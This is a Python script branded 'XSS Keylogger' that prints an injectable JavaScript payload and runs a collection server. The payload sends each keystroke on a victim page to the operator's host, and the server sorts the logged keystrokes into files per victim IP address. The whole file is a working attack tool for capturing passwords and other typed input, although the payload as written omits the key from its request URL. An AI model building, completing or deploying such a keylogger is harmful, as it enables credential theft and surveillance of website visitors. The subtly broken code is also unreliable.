import time
import threading
import http.server
import socketserver
import argparse
import os
import re
from datetime import datetime

def banner():
    banner = """
██╗  ██╗███████╗███████╗    ██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
╚██╗██╔╝██╔════╝██╔════╝    ██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
 ╚███╔╝ ███████╗███████╗    █████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
 ██╔██╗ ╚════██║╚════██║    ██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
██╔╝ ██╗███████║███████║    ██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝

Created by eMVee
"""
    print(banner)

def generate_keylogger_js(webserver_url):
    js_code = '<script>'
    js_code += '\n'
    js_code += '    document.addEventListener("keydown", function(event) {'
    js_code += '\n'
    js_code += '        var key = event.key;'
    js_code += '\n'
    js_code += '        var xhr = new XMLHttpRequest();'
    js_code += '\n'
    js_code += f'        xhr.open("GET", `{webserver_url}/k?key=`, true);'
    js_code += '\n'
    js_code += '        xhr.send();'
    js_code += '\n'
    js_code += '    });'
    js_code += '\n'
    js_code += '</script>'
    js_code += '\n'
    print(js_code)

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        log_message = f"{self.client_address[0]} - - [{time.strftime('%Y-%m-%d %H:%M:%S')}] {format%args}\n"
        with self.server.log_file_lock:
            if time.time() - self.server.last_request_time > 30:
                old_log_filename = self.server.log_filename
                self.server.log_file.close()
                log_filename = f"{time.strftime('%Y%m%d-%H%M%S')}-log.txt"
                self.server.log_file = open(log_filename, 'a')
                self.server.log_filename = log_filename
                print(f"[+] Time started new log: " + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")))
                print(f"[+] Saving new log to: {log_filename}")
                print(f"[+] Full old log saved under: {old_log_filename}")
                process_log(old_log_filename)
                print(110 * '=')
            self.server.log_file.write(log_message)
            self.server.last_request_time = time.time()
    
def process_log(log_file):
    with open(log_file, 'r') as file:
        lines = file.readlines()

    ip_addresses = set()
    for line in lines:
        ip_address = re.search(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', line).group()
        ip_addresses.add(ip_address)

    for ip_address in ip_addresses:
        ip_lines = [line for line in lines if ip_address in line]
        date_time = re.search(r'\[(.*?)\]', ip_lines[0]).group(1)
        date_time = re.sub(r':', '', date_time)
        date_time = re.sub(r'-', '', date_time)
        date_time = re.sub(r' ', '-', date_time)
        keys = []
        for line in ip_lines:
            match = re.search(r'k\?key=(\S*\s*)', line)
            keylog= ""
            if match:
                key = match.group(1)
                keys.append(key)
        keys = [key.replace(' ', '') if len(key) > 1 else key for key in keys]
        keys = [key.replace('  ', ' ') for key in keys]
        filename = f'{date_time}-{ip_address}.txt'
        print(f'[+] There is a file for {ip_address} stored as {filename}')
        with open(filename, 'w') as file:
            file.write(''.join(keys))
        print(f'[!] {ip_address} => ' + print_file_content(filename))

def print_file_content(filename):
    try:
        with open(filename, 'r') as file:
            content = file.read()
            return(content)
    except FileNotFoundError:
        print(f"[-] File {filename} not found.")
    except Exception as e:
        print(f"[-] Error occurred while reading the file: {e}")

def start_webserver(ip, port):
    Handler = CustomHTTPRequestHandler
    with socketserver.TCPServer((ip, port), Handler) as httpd:
        httpd.log_file_lock = threading.Lock()
        httpd.log_filename = f"{time.strftime('%Y%m%d-%H%M%S')}-log.txt"
        httpd.log_file = open(httpd.log_filename, 'a')
        httpd.last_request_time = time.time()
        print(110 * '=')
        print(f"[+] Serving on http://{ip}:{port}")
        print("[+] Time started: " + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")))
        print(f"[+] Saving log to: {httpd.log_filename}")
        print(110 * '=')
        print("[!] The XSS payload should be;\n")
        generate_keylogger_js(f"http://{ip}:{port}")
        print(110 * '=')
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nShutting down server...")
            httpd.shutdown()
            httpd.server_close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Start a webserver on a specified IP address and port.")
    parser.add_argument("ip", nargs="?", default="0.0.0.0", help="The IP address to serve on. Default is 0.0.0.0.")
    parser.add_argument("port", nargs="?", type=int, default=80, help="The port to serve on. Default is 80.")
    args = parser.parse_args()
    banner()
    start_webserver(args.ip, args.port)
